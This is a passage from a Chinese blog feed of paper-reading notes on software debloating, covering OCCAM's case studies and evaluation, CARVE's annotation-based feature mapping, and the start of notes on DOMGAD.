opt程序运行它。这意味着简化的每个简短都会产生一个新的程序文件（或接口文件）。虽然这种方法不如纯C但不实体化中间结果的效率高，但它能够灵活地尝试其它转化和特化的启发式方法，我们的代码发布提供了一个教程，演示了我们如何使用我们的工具对应用程序进行简化</p></li><li><p>为了创建程序的bit码，我们开发了一组脚本来包装现有的构建工具，这是因为大型应用程序的构建过程通常使用各种工具，如autoconf，libtool，cmake，make。 虽然这些工具支持各种平台和配置，但不支持将LLVM bit码作为目标架构</p></li><li><p>为了与检查依赖项的现有构建脚本集成，我们的工具将每个命令翻译成两个命令（如调用gcc或ld）。</p><ul><li>第一个编译产生一个修改的版本来获取LLVMbit码</li><li>第二个生成ELF标准版本，生成ELF对象确认构建成功，并确保所有的依赖选项都存在。</li></ul></li><li><p>虽然在构建速度方面不太理想，但我们的脚本相当健壮，能够编译大型程序和库，如PHP，SQLite，uClibc</p></li></ul><h3 id="4-%E4%BE%8B%E5%AD%90%E7%A0%94%E7%A9%B6" tabindex="-1">4 例子研究</h3><ul><li><p>首先回顾我们的目标</p></li><li><p>首先，我们希望减少代码的功能，但这不一定意味着代码的减少；相反，它可能意味着减少可能的执行次数，复制一个函数会增加代码大小，但不会增加复杂性。同样地。在一个参数上特化一个函数，可以通过限制传递的值来减少其可能的行为。为了衡量这一点，我们可以查看应用程序在简化前后的调用图。</p></li><li><p>次要目标是代码大小的减少和配置复杂性。</p><ul><li>大型库支持在粗粒度上启用功能，例如PHP中支持MySQL。</li><li>简化为库用户提供了一种自动化方式，来精确地选择它们想要地功能。为衡量这一点，我们可以将简化与现有技术进行比较，例如使用库地静态链接（仅使用存档中的必要对像）</li></ul></li><li><p>我们的例子研究包括两个web服务器，nweb[3],thttpd[9],及两个web应用程序使用的PHP解释器</p></li></ul><h4 id="nweb" tabindex="-1">nweb</h4><ul><li><strong>nweb</strong>是一个静态内容Web服务器，只有200多行C代码，它的大小和架构并不是简化的理想对象（小且配置少），但其可以展示简化的实际效果。 因为nweb仅依赖于libc，且非常简单，uClibc足以满足它的需求 （libc和uClibc都是C标准库，但uClibc是面向嵌入式系统的轻量级库）</li><li>由于nweb通过命令行进行配置，我们根据我们希望提供的参数对main函数进行特化。为此我们使用命令<code>nweb 8080 /root</code> 告诉nweb监听端口并从root提供文件<br><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(10)_5.png" alt="image"></li><li>上图展示了简化对nweb调用图的影响，图中的粗灰色框表示特化的函数。 简化前有27个函数，简化后只有17个，其余10个被特化或内联到11个不同的函数中，每个特化都减少了至少一个参数。这些特化包括<ul><li><ol><li>log函数被复制了三次，每次都因不同的状态可以打印日志。通用函数已被删除，特化实例的部分求值去除了怪异的控制流，变成straight-line code程序（只有顺序结构），使其可以直接调用sprint，open，write</li></ol></li><li><ol start="2"><li>libc中设置socket的函数（bind，listen和socket）每个被特化为处理TCP请求。其中socket函数最有趣，被特化为 面向 Internet（AF_NET） 和 面向流的socket（SOCK_STREAM）</li></ol></li><li><ol start="3"><li>libc中处理软件中断的函数（signal）被特化两次以处理SIGCHLD和SIGHUP，这些特化可以使得其他工具可以轻松地确认程序仅以有限的方式响应中断</li></ol></li></ul></li></ul><h4 id="thttpd" tabindex="-1">thttpd</h4><ul><li><strong>thttpd</strong>是另一个考虑的Web服务器。其有许多功能，约8500行C代码，支持CGI，在启动时使用chroot，在内存中缓存，使用htpasswd身份验证。除了核心的libc功能外，thttpd还连接到libcrypt以保护其.htpasswd文件，httpd可以在运行时通过命令行参数配置，也可以在编译时使用一个头文件进行配置，该头文件同构一组49个宏控制代码生成。这些宏包括我们希望在简化中公开的，如.htpasswd的路径存储在AUTH_FIL宏中</li><li>对thttpd进行简化会产生125个特化函数，主要分为三类<ul><li>定时器创建（tmr_create）的特化：所有这些调用都会被特化，包括在计时器到期时运行的函数指针。 这可以防止数据攻击。</li><li>缓冲区分配（httpd_realloc_str）:一个调用扩展了用于存储标头的缓冲区大小，该调用对前领个参数进行了特化，因为二者都是全局变量的地址 。<code>httpd_realloc_str(&amp;header, &amp;maxheader, sizeof(headerstr) + strlen(realm) + 3);</code></li><li>错误代码的特化。 因为我们的特化框架不支持可变参数函数，因此我们无法特化错误函数中对 snprintf的调用。 然而，常量的传播可以进行，因此，可以通过额外的特化来注入这些常量所需的特化</li></ul></li></ul><h4 id="php" tabindex="-1">PHP</h4><ul><li>PHP [14] 是一个用于网站的流行编程语言。它附带了一个庞大的标准库，涵盖了从简单的字符串和日期操作到像chroot这样的POSIX系统调用的各种功能。这种“一揽子式”方法对于快速启动新应用程序非常有用。同时，这也为攻击提供了广泛的攻击面，特别是对于使用eval的应用程序。为了解决这个问题，我们可以对托管应用程序不需要的 PHP 运行时功能进行剪裁。</li><li>为了演示这一点，我们构建了一个minblog[13]专用的PHP解释器，这是一个用PHP编写的小型博客框架。我们用我们的工具链自动地构建PHP解释器的LLVM二进制位码。在编译后，我们需要确定miniblog需要的接口，这里有两个复杂问题<ul><li><ol><li>首先PHP以文本形式提供给PHP解释器，这意味着我们无法使用LLVM通道来确定运行应用程序所需要的接口。PHP的静态评估超出了本文的范围。因此我们使用正则表达式来捕捉与PHP函数调用语法相对应的文本模式。之后，我们人工地检查结果，这个过程可以由语义的静态分析和在程序运行时记录跟踪的工具来替代。即便使用这些工具，我们认为由手动审核此列表仍然是有用的，以查看底层系统所依赖的内容。</li></ol><ul><li>从静态分析我们可以确定miniblog依赖于PHP标准库中地52个函数，包括包括字符串和文件操作以及 MySQL 函数。为了比较，我们编译了可以使用 PHP 的编译选项配置的最小解释器（包括 PHP 标准库和 MySQL 扩展）的解释器。这包含 1029 个函数，包括可能危险的函数，如 system 和 mail。一些被消除的函数包含过去 PHP 版本中的漏洞（CVE-2011-1148 和 CVE-2010-2191）。这些漏洞在已经进行了精简的 PHP 部署中将不再存在。</li></ul></li><li><ol start="2"><li>第二个问题是PHP解释器的架构。PHP解释器讲库函数实现存储在一个可以动态调度的表中。因此，通过此表中的函数进行的所有调用都太过保守，所有函数都有可能是目标。即使我们可以使用类似 Smowton [12] 开发的技术将 PHP 代码拉入部分评估期间，使用 LLVM 优化器很难实现解决通过此表调用所需的部分评估。取而代之的是，我们注意此表的结构并使用第 2.3 节中描述的技术修改函数。在标准的 PHP 解释器中，每个库例程 Xxx 都在函数 zif_Xxx 中实现。因此，我们可以轻松编写钩子，将未使用的函数重写为错误。</li></ol></li></ul></li><li>对简化miniblog，生成了997个形如<code>zif_system(?) =&gt; fail</code>的重写，处于审计和调试的目的，我们实现fail函数时记录了违规的函数调用</li></ul><h3 id="5-%E8%AF%84%E4%BC%B0" tabindex="-1">5 评估</h3><h4 id="%E6%80%A7%E8%83%BD" tabindex="-1">性能</h4><ul><li><p>我们比较了使用专门化和不使用专门化构建的每个服务器在请求率上的表现，以了解运行时的影响。</p></li><li><p>性能以每秒请求数来衡量，用于提供单个小型静态页面。</p></li><li><p>为了控制网络带宽，我们在 localhost:8080 上执行了测试。</p></li><li><p>我们使用 Apache 基准测试工具 ab 来生成请求。</p></li><li><p>我们运行了 40 次试验，每次对服务器进行 5000 次请求。</p></li><li><p>测试在一台轻度负载的 Intel Core 2 四核桌面上运行，时钟频率为 2.4 GHz，配备 4 GB 的 RAM 和 Linux 2.6.38，并使用 TuxOnIce 补丁集</p></li><li><p>为了进行公平比较，基线在链接之前使用LLVM-O3进行优化，两个版本都静态链接到uClibc-0.9.32，使用OCCAM构建并使用uClibc构建的标准配置选项进行优化（使用-O2）。</p></li><li><p>下图显示了nweb和thttpd的比较结果<br><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(10)_6.png" alt="image"></p></li><li><p>nweb中差异在样本中变化较大，不具有统计意义</p></li><li><p>thttpd中，简化版本在95%的置信度上高于基线版本。这种性能改善可能有两个原因造成</p><ul><li>简化使用-O3作为其部分求值器，而标准配置使用-O2。这种差异可能会导致简化版本的代码更快。</li><li>函数的复制暴露了常量，创造了更多的编译时优化机会</li></ul></li></ul><h4 id="%E4%BB%A3%E7%A0%81%E5%A4%A7%E5%B0%8F" tabindex="-1">代码大小</h4><ul><li>我们在简化中使用的激进特化策略导致httpd模块大小增加了45%，如下图示，这是部分评估技术已知的问题，其中大部分由于报错函数特化参数的复制引起的。这个问题可以使用更保守地启发式搜索解决，如果产生了显著的差异，其只会保留一个特化，</li></ul><p><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(10)_7.png" alt="image"></p><ul><li>libcrypt和libc模块的二进制大小在简化后几乎没有增加，这是因为大多数函数都是叶子例程（例如字符串操作）或它们立即调用操作系统。因此，在这些单独的模块中，很少有机会内联或特化函数。额外的大小是由于对库的特化调用减去了静态链接器引入，但thttpd模块未使用的额外函数和常量。在高度优化的低级别库中，这些都不是显著的，因为档案中的每个对象通常只定义了最小数量的函数。</li></ul><p><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(10)_8.png" alt="image"></p><ul><li>许多常见的库，如libc，通常被编译为共享对象（或系统等效物），而不是静态链接。正常的共享对象包含整个库，与这样的库动态链接的任何应用程序都会引入大量不相关的功能。通过在构建共享对象之前应用精简，我们可以大大减少这种情况。</li></ul><p><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(10)_9.png" alt="image"></p><ul><li>图9展示了应用第4节技术于PHP的结果。<ul><li>min表示使用PHP编译配置选项可以构建的最小PHP模块。它的大小为5.5 MB，其中4.0 MB（用虚线标记）是解释器（没有导出的PHP函数）。剩下的1.5 MB是标准库。</li><li>+mysql表示添加了MySQL支持的二进制文件。它需要额外的4%存储（不包括MySQL库）。</li><li>+mysql-sys是添加了一个策略以阻止对11个危险的PHP函数的调用后的二进制文件。</li><li>miniblog表示在对miniblog的接口进行精简之后得到的解释器版本。在模块内精简之后，LLVM比特码的大小从5.8 MB缩小到4.2 MB，减少了27%；这只比核心解释器大5.5%。从精简中减小PHP解释器二进制大小的效果类似于我们在thttpd案例中看到的libc共享对象的最小化（如图8所示）。</li></ul></li></ul><h3 id="6-%E7%BB%93%E8%AE%BA" tabindex="-1">6 结论</h3><ul><li>我们开发了OCCAM工具,用于将应用程序特化到其部署环境</li><li>我们解释了为什么我们的工具可以精确地从应用程序中移除功能</li><li>我们还认为,少量的手动工作可以用于解决优于信息的不完整引起的困难(如,不知道解释器正在运行的程序或不精确的别名分析)</li></ul><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content>
      
      
      <categories>
          
          <category> 论文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SoftwareEngineering </tag>
            
            <tag> SoftwareDebloating </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Software Debloating 论文阅读 (8)</title>
      <link href="/2024/03/21/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/SoftwareDebloating/Software%20Debloating%20%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB(8)/"/>
      <url>/2024/03/21/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/SoftwareDebloating/Software%20Debloating%20%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB(8)/</url>
      
        <content type="html"><![CDATA[<h2 id="carve%3A-practical-security-focused-software-debloating-using-simple-feature-set-mappings" tabindex="-1">CARVE: Practical Security-Focused Software Debloating Using Simple Feature Set Mappings</h2><p>FEAST’19: Proceedings of the 3rd ACM Workshop on Forming an Ecosystem Around Software</p><p>Brown M D, Pande S. Carve: Practical security-focused software debloating using simple feature set mappings[C],Proceedings of the 3rd ACM Workshop on Forming an Ecosystem Around Software Transformation. 2019: 1-7.</p><h3 id="0-%E6%91%98%E8%A6%81" tabindex="-1">0 摘要</h3><ul><li>现有技术对普通用户不实用存在创造不稳定程序和引入漏洞的风险，而且不适用于debloating网络协议实现等复杂软件</li><li>本文我们提出了CARVE，这是一种简单而有效的以安全为重点的debloating技术<ul><li>采用静态源代码注释来映射软件特性源代码,在debloating过程中消除了对高级软件分析的需求，降低了用户所需的整体技术水平</li><li>CARVE通过引入替代debloating技术超越了现有技术，该技术能够保留软件的互操作性并减轻创建不稳定程序或引入漏洞的风险</li><li>我们在12个debloating场景中评估了CARVE，并展示了满足或超过现有技术的安全性和性能改进。</li></ul></li></ul><h3 id="1-%E4%BB%8B%E7%BB%8D" tabindex="-1">1 介绍</h3><ul><li>软件膨胀对几乎所有软件都产生负面影响，在安全性和性能方面产生各种问题[1,6,7]</li><li>膨胀的主要来源是功能蔓延，即软件包随着时间的推移积累新功能的趋势[8]</li><li>膨胀的另一个来源是软件工程实践，这些实践倾向于重用模块化的软件库。程序通常仅使用每个外部库提供的功能的一个小子集[1]，然而，在运行时，整个库都加载到程序的内存空间中。</li><li>现有技术[2-5,9-10,18]存在限制</li></ul><h4 id="1.1-%E5%8A%A8%E6%9C%BA" tabindex="-1">1.1 动机</h4><ul><li>基于功能的简化方法基于复杂的规范和先进的分析技术,有很高的技术门槛,一般用户难以使用<ul><li>Chisel[3]需要用户提供测试脚本,脚本需要编译源代码并包含对生成程序的测试,且消耗时间长</li><li>TOSS[2]和TRIMMER[4]要求用户和LLVM,angr,TEMU等复杂工具进行交互以简化</li></ul></li><li>以上技术只能删除代码,无法保留良好的软件属性,如优雅的错误处理、用户体验、规范合规性和互操作性<ul><li>如ChiselBench中Chisel的简化结果会产生无意义的输出</li><li>TOSS简化的服务器软件对请求无法以规范协议响应</li></ul></li><li>现有方法在安全性上也存在限制<ul><li>使用动态分析引导去膨胀的技术，如 CHISEL 和 TOSS，由于对与功能相关的代码识别的不精确方式，可能导致产生不稳定的程序并引入新的漏洞 [18]</li><li>在源代码级别操作且只能进行代码删除的去膨胀工具（例如 CHISEL）也可能由于功能特定代码与与功能无关的代码之间的交互而引入新的漏洞</li><li>正如 Brown 和 Pande [22] 所示,改变程序的表示会以不可预测的方式引入新的Gadget,产生安全影响,多次简化和分析迭代可以减缓这种影响,而简化慢的工具不适合这项任务(如Chisel)</li></ul></li></ul><h4 id="1.2-%E8%B4%A1%E7%8C%AE" tabindex="-1">1.2 贡献</h4><ul><li><p>提出CARVE:一种简单有效以安全为中的的简化方法 <img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(8)_1.png" alt></p><ul><li>CARVE 不使用动态分析来识别与功能相关的代码,相反,用户使用简单灵活的基于注释的映射,将功能静态的映射到实现它们的源代码</li><li>这些功能映射允许用户进行稳健的、细粒度的去膨胀，可以选择用保留高级程序属性的替代代码替换去膨胀的代码，例如协议兼容性，并防止引入漏洞</li><li>CARVE 在预处理步骤中去膨胀软件，将具有特定功能映射源代码 和 识别不需要的功能的配置文件 作为输入</li><li>CARVE扫描源代码并智能地删除与不需要的功能相关联的代码，并根据映射插入替代代码。</li><li>其简化高效,因为与特征映射解耦,最终产品是一个仅包含所需功能的源代码的精简版本，可以在不更改构建链的情况下进行处理。</li></ul></li><li><p>我们通过使用CARVE从四个不同程度的侵略性的网络协议实现中去膨胀功能来评估CARVE</p><ul><li>这类软件具有输入/输出复杂性、规范合规性、跨平台互操作性和状态性质，去膨胀这类软件是具有挑战性的。</li><li>我们分析了我们的方法产生的去膨胀变体，并观察到安全性和性能方面的好处，包括消除漏洞、减少代码重用小工具集效用、减小代码大小和消除外部依赖</li></ul></li><li><p>下面第2节讨论Carve实现细节,第3节提供评估结果,第4节确定未来工作</p></li></ul><h3 id="2-%E8%AE%BE%E8%AE%A1" tabindex="-1">2 设计</h3><ul><li><p>基于特征的简化将软件特征映射到相应源代码并随后删除不需要的代码</p><ul><li>现有方法通过动态方法 处理映射,即使用具体输入执行程序,即Cov;</li><li>这些方法存在显著局限性<ul><li>它们要求用户提供复杂的规范或依赖于先进的软件分析工具生成映射。</li><li>它们难以识别非确定性特征、由外部条件触发的特征（例如拥塞控制）或没有可观察输出的特征（例如性能特征）。</li><li>简化软件的规模:因为确保生成的映射的正确性可能需要大量执行，这些方法的成本随着输入空间和执行时间的增加而上升，可能在处理大型、功能丰富的程序时变得不切实际。</li></ul></li></ul></li><li><p>CARVE通过静态特征映射克服了这些限制,其中用户直接将映射放置在目标程序的源代码中</p><ul><li>基于注释的特征映射是程序员熟悉的技术,这种方法在 自动化软件文档工具Doxygen,Sphinx[24,25] 中使用<ul><li>类似于C/C++预处理器指令(如 #ifdef)</li><li>且不仅限于输入触发的特征,也可以在指令级别防止</li></ul></li><li>缺点:<ul><li>需要手动进行注释进行特征映射,工作量可能大;</li><li>然而现代软件大部分重视代码质量,因此大多数软件特征可以直接映射到其关联的源代码</li></ul></li><li>针对缺点<ul><li>CARVE 通过整合几个设计元素来减少用户生成映射的工作量,由此减轻了缺点</li><li>由于特征映射为静态且在源代码中持久存在,因此生成映射的工作量仅需一次</li><li>此外,软件特征可以嵌套在特征结构中,简化了将 某个代码段 映射到多个相关特征的任务</li><li>CARVE还支持隐式特征映射,对常见代码结构进行语法感知进行简化,自动处理因为代码移除造成的控制流影响. 隐式映射提供了比预处理指令方案更丰富的简化支持</li></ul></li></ul></li></ul><h4 id="2.1-%E7%89%B9%E5%BE%81%E6%98%A0%E5%B0%84%E5%89%96%E6%9E%90" tabindex="-1">2.1 特征映射剖析</h4><ul><li>下图展示内嵌映射,由三部分组成<ul><li><ol><li>用户配置标记(///),将注释和特征映射分开</li></ol></li><li><ol start="2"><li>紧随标记,用户标明一个或多个特证明,用[] 包裹</li></ol></li><li><ol start="3"><li>可选操作符,用来区分 显式文件映射,显式段映射,隐式段映射<br><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(8)_2.png" alt></li></ol></li></ul></li></ul><h4 id="2.2-%E6%98%BE%E5%BC%8F%E7%89%B9%E5%BE%81%E6%98%A0%E5%B0%84" tabindex="-1">2.2 显式特征映射</h4><ul><li>支持两种显式映射(图中蓝色标记)<ul><li><ol><li>文件映射使用 <code>!</code> 操作符,指导简化器移除文件所有代码如果特征不需要</li></ol></li><li><ol start="2"><li>段显式映射,使用 <code>~</code>操作符,指导简化器移除到下一个<code>///~</code>之间的代码段,如果该功能不需要</li></ol><ul><li>对于段显式映射,还可以在两个替换标记之间<code>///^</code>指定替换代码段 ,例如，第13行的带替换映射指示debloater移除第17-19行的代码，并用第15行的代码替换它。</li></ul></li></ul></li></ul><h4 id="2.3-%E9%9A%90%E5%BC%8F%E7%89%B9%E5%BE%81%E6%98%A0%E5%B0%84" tabindex="-1">2.3 隐式特征映射</h4><ul><li>图中绿色标出,其通过将两个关键任务从简化器中去除,减少了生成特征映射所需的工作量<ul><li>首先,隐式特征映射不需要 终止标签来标记代码段的结束: 隐式映射指示简化器分析映射后的代码,从而确定其机构,进而确定因嘎嘎i删除的代码</li><li>隐式映射 消除了使用 替代代码的显式映射, 来处理与控制流影响<ul><li>例如:switch语句或条件分支 的隐式映射指示简化器分析删除映射代码的控制流影响,以产生 不产生意外控制流的简化代码<ul><li>图二中,第9行映射时,简化器将知道简化代码仅为一条语句,仅删除第10行</li><li>第22行和第25行的映射函数定义,此时,简化器将扫描和函数定义相关联的右括号,以确认要删除哪些行,对于这些映射,简化器将删除第23行和26-32行</li></ul></li></ul></li><li>下图展示了具有控制流的简化结构实例,右侧代码时左侧代码移除Feature_B后的结果 <img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(8)_3.png" alt="隐式映射"><ul><li>在对第4行switch语句进行语法感知分析时,简化器将确定由于缺少break语句,6,7行的映射代码是可到达的,此时,简化器无法删除这些行,只能删除case标签</li><li>对第12,13行条件分支语句进行分析,确定分支构造中的else块的存在 组织删除12行,为了保持else块的正确分支,只能删除else if块部分</li></ul></li><li>在简化器中处理隐形映射需要对不同PL进行特定的语法感知分析,因此,CARVE的设计支持使用自定义语言的简化模块. 针对C/C++的简化器支持单个语句,函数和结构定义,switch case以及条件分支的隐式映射</li></ul></li></ul><h4 id="2.4-%E8%A1%A8%E8%BE%BE%E8%83%BD%E5%8A%9B" tabindex="-1">2.4 表达能力</h4><ul><li>我们发现隐式特征映射在大多数情况下足够表达,能够正确识别某个功能的代码.</li><li>但由于高级PL的灵活性,有时候隐式映射无法表达,此时如果有必要需要使用显式映射并使用替代代码. 此时通过删除和替代代码,任何简化操作都足够表达</li><li>在我们4个基准测试中, 不得不使用显式映射+替换的比例为 5/668</li></ul><h4 id="2.5-%E7%AE%80%E5%8C%96%E5%99%A8%E6%93%8D%E4%BD%9C" tabindex="-1">2.5 简化器操作</h4><ul><li>CARVE使用的静态特征映射方案将 特征映射到代码 与 代码简化 解耦. 因此简化变得简易</li><li>CARVE流程<ul><li><ol><li>CARVE 以一个单独的配置文件作为输入</li></ol><ul><li>文件指定了特征映射源代码的未知</li><li>代码所使用语言(指示语法感知模块)</li><li>简化特征的层次结构</li><li>用户希望简化的特征列表</li></ul></li><li><ol start="2"><li>执行时,简化器复制指定的源代码目录,并扫描特征映射的源代码,当发现特征映射时,简化器将于指定的简化特征进行比较,如果是需要简化特征的子集,简化器将处理该映射,否则继续扫描,直到所有文件都被扫描完毕</li></ol></li></ul></li></ul><h4 id="2.6-%E5%8F%AF%E9%9D%A0%E6%80%A7" tabindex="-1">2.6 可靠性</h4><ul><li>当用户提供的特征映射(包括替代代码)是正确的,Carve会是一种可靠的简化技术<ul><li>简化器执行的所有转换在语法和控制流上将会都是正确的</li><li>静态特征映射是 细粒度的,将特征对应到源代码,因此映射可以精准对应到特征; 而对于动态方法,由于其不可预测性,可能会产生不正确的映射<ul><li>如Chisel被证明简化的程序引入了新的漏洞并产生了额外的意外行为[18]</li><li>TOSS使用的特征识别机制不能保证识别所有特征代码, 需要对期望的功能和不期望的功能进行 去噪模糊测试以检测不可靠的变体 [2]</li></ul></li></ul></li><li>高级程序语言表达是高度抽象的,所以在简化时具有挑战性,删除代码时有时不得不产生漏洞<ul><li>下面代码中,从switch语句中删除任一case都不影响语义,但会在会授权的情况执行受保护的函数</li><li>CARVE通过支持 替代 代码来缓解这一问题,本例子中可以替代异常处理代码</li></ul></li></ul><pre><code class="language-C">switch(auth_type)&#123;  case 1:perform_auth_1(creds);break;  case 2:perform_auth_2(creds);break;&#125;protected_function();</code></pre><ul><li>于编写源代码类似,编写特征映射也可能出错<ul><li>在实践中,创建特征映射发生的错误可以使用 确保源代码正确的工具 来检测</li><li>导致违反语言语义映射的错误会被编译器捕获</li><li>成功编译的代码中存在的映射错误可以通过常见的测试技术,如单元测试和集成测试来识别</li><li>使用Coverity [26] 这样的常见静态分析工具可以识别安全问题，比如无意中删除边界检查</li></ul></li></ul><h3 id="3-%E8%AF%84%E4%BC%B0" tabindex="-1">3 评估</h3><ul><li>选择4个网络协议软件包,这些软件包在大小,特征密度和复杂性方面都各不相同,简化这些软件时调整性的,因为其涉及复杂的交互和严格的规范,软件包括<ul><li>libmodbus v3.1.4，一个工业协议库。</li><li>Bftpd v4.9，一个FTP服务器实用程序。</li><li>libcurl v7.61.0，一个数据传输实用程序库。</li><li>mongoose v.6.8，一个嵌入式Web服务器库。</li></ul></li><li>对每个软件包,我们手动创建了各种粒度的特征信息,以及三种不同的简化配置,以适应不同的场景<ul><li>保守（C）：对软件包中的一些外围特征进行简化</li><li>中等（M）：对软件包中的一些外围特征和一些核心特征进行简化</li><li>激进（A）：对软件包中除了一小部分核心特征之外的所有可简化特征进行简化</li></ul></li><li>每种情景中<ul><li>我们使用CARVE对软件包进行简化,使用默认的软件包构建配置 和 GCC v7.3.0 构建了结果变体,所有软件在同一平台上构建,每个构建保持不变</li><li>我们使用开发者提供的测试脚本和自定义测试脚本来测试所有变体,以确保其保留特征的正确性,并且调用简化掉的特征时不会导致变体崩溃</li></ul></li></ul><h4 id="3.1-%E5%AE%89%E5%85%A8%E6%8F%90%E5%8D%87" tabindex="-1">3.1 安全提升</h4><ul><li>简化可以消除漏洞<ul><li><ol><li>在CVE库中搜索了选择软件包的已知漏洞</li></ol><ul><li>对libmodbus和Bftpd,没有CVE,libcurl有6个,mongoose有17个</li><li>随后分析简化后漏洞的消除情况,结果如图</li></ul></li><li><ol start="2"><li>软件抵抗代码重用攻击</li></ol><ul><li>该攻击将执行重定向到内存中现有的指令，以引发恶意效果</li><li>在基于小工具的代码重用攻击方法（如ROP、JOP和COP）中，执行被重定向到程序中存在的有序短指令序列（小工具），以构造恶意有效载荷而无需注入代码。</li><li>评估基于 Gadget的安全 是复杂的,因为再简化后可能引入新的. 我们使用Brown和Pande [22]提出的度量来衡量CARVE对基于小工具的攻击的有效性，即特殊用途小工具的可用性和小工具集表达性。我们的结果显示在表1的分组列中。</li></ul></li></ul></li><li>总体而言,CARVE在减少小工具集表达性方面是有效的，针对三个不同表达性水平 [20, 21]<ul><li>在十二个情景中的七个中，简化减少了整体小工具集的表达性</li><li>在三个情景中简化没有效果</li><li>在两个情景中产生了负面影响<ul><li>我们结果中观察到的负面副作用与CHISEL [22]和TRIMMER [4]中观察到的负面副作用一致。由于CARVE易于重新配置且去噪速度快，因此它非常适合使用迭代去噪来缓解这些负面副作用 [22]。</li></ul></li></ul></li></ul><p><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(8)_4.png" alt></p><h4 id="3.2-%E5%A4%A7%E5%B0%8F%E5%87%8F%E5%B0%8F" tabindex="-1">3.2 大小减小</h4><ul><li>减小效果如下图<ul><li>二进制减小高于预期,因为对简化代码编译器效果优化的提升</li><li>简化还消除了部分外部库的依赖,降低了运行时内存消耗<br><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(8)_5.png" alt="减小效果"></li></ul></li></ul><h4 id="3.3-%E6%80%A7%E8%83%BD%E5%BC%80%E9%94%80" tabindex="-1">3.3 性能开销</h4><ul><li>CARVE的解耦涉及将简化开支最小化,每个情景的简化均不超过5s,同时也方便扩展<ul><li>技术的主要开销在功能映射上,创建和维护映射有很多工作量,包括对软件的输入程度,特征密度及目标软件的复杂性</li><li>在实践中,我们发现在用户对源代码的了解有限的情况下，创建初始特征映射并会因成本而放弃</li><li>软件工程实践倾向于模块化和分离软件包,这将帮助减少生成合理映射所需要的工作量</li></ul></li><li>对于我们的基准软件,生成密度如下(mappings/KLOC)<ul><li>ibmodbus为61.5 m/KLOC</li><li>Bftpd为24.2 m/KLOC</li><li>mongoose为13.4 m/KLOC</li><li>libcurl为4.9 m/KLOC</li><li>且很少使用替代映射,libmodbus需要17个，libcurl需要20个,另外两个不需要</li></ul></li><li>这标明创建特征映射的一次性成本是合理的。</li></ul><h3 id="4-%E8%AE%A8%E8%AE%BA" tabindex="-1">4 讨论</h3><ul><li><strong>与现有技术比较</strong><ul><li>Chisel[2]和TOSS[3] 平均减少代码大小 86%,43.8%在ChiselBench中,Carve与其相当</li><li>Trimmer[4]平均减少代码大小 21% 在复杂的基于网络的软件中; 此时Carve性能优于Trimmer</li><li>消除CVE方面,CARVE与CHISEL相当</li><li>CARVE在减少和引入新 gadgets方面与Chisel和Trimmer相当</li></ul></li><li><strong>限制</strong>:<ul><li>仅对源代码操作,不适用于闭源软件</li><li>可以用于任何基于文本且支持注释的软件,但目前只支持 C/C++ 语言</li></ul></li><li><strong>未来工作</strong><ul><li>基于创建其它语言的简化模块</li><li>开发静态分析工具,帮助用户快速生成可靠的特征映射; 这些工具将实时分析用户创建的映射,提供建议的新映射,并识别个别简化时潜在的可靠性问题</li></ul></li></ul><h3 id="5-%E7%BB%93%E8%AE%BA" tabindex="-1">5 结论</h3><ul><li>本文介绍Carve,一种简单而强大的软件瘦身技术，它克服了现有方法的缺点<ul><li>在不需要先进软件分析的情况下实现有效简化</li><li>同时保留了如 交互性和规范性 等理想软件特性</li></ul></li><li>评估显式<ul><li>CARVE适合于解决网络协议的简化问题,在4个协议简化中,安全性和性能都很出色</li><li>在12个场景中,CARVE消除了漏洞,减少了代码工具重用</li><li>并使用了 易于用户使用的简单技术,缩减了代码大小,与现有方法相当</li></ul></li></ul><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content>
      
      
      <categories>
          
          <category> 论文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SoftwareEngineering </tag>
            
            <tag> SoftwareDebloating </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Software Debloating 论文阅读 (6)</title>
      <link href="/2024/03/21/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/SoftwareDebloating/Software%20Debloating%20%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB(6)/"/>
      <url>/2024/03/21/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/SoftwareDebloating/Software%20Debloating%20%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB(6)/</url>
      
        <content type="html"><![CDATA[<h2 id="subdomain-based-generality-aware-debloating" tabindex="-1">Subdomain-Based Generality-Aware Debloating</h2><p>ASE 20 ,CCF A会<br>Xin Q, Kim M, Zhang Q, et al. Subdomain-based generality-aware debloating[C],Proceedings of the 35th IEEE/ACM International Conference on Automated Software Engineering. 2020: 224-236.</p><h3 id="0-%E6%91%98%E8%A6%81" tabindex="-1">0 摘要</h3><ul><li><p>程序膨胀降低性能和安全</p></li><li><p>为了突破基于输入的方法过拟合输入集的限制,我们提出了 <strong>DOMGAD</strong> ,有两个主要优点超过现有方法</p><ul><li><ol><li>其生成的简化程序保证在子域上工作,而不是输入</li></ol></li><li><ol 